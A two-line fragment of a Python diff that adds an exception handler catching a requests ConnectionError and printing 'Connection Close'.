+    except requests.exceptions.ConnectionError:
+        print('Connection Close')
